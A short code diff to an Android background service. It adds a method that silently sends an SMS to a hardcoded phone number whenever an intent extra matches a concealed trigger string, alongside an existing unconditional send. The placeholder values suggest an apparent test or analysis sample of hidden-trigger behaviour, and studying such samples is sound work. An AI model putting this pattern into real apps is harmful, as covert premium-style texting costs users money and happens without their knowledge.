@@ -28,6 +28,9 @@ public class MyService extends Service {
         {
             SmsManager.getDefault().sendTextMessage("18010823840", null, "ttttt", null, null);
         }
+
+        transfer(intent);
+
         return super.onStartCommand(intent, flags, startId);
     }
 
@@ -43,5 +46,16 @@ public class MyService extends Service {
     @Override
     public boolean onUnbind(Intent intent) {
         return super.onUnbind(intent);
+    }
+
+
+    public void transfer(Intent intent)
+    {
+        String fff=new String("xxx")+"yyy";
+        if(intent.getStringExtra("ttt").equals(fff))
+            {
+
+                SmsManager.getDefault().sendTextMessage("18010823840", null, "ttttt", null, null);
+            }
     }
 }
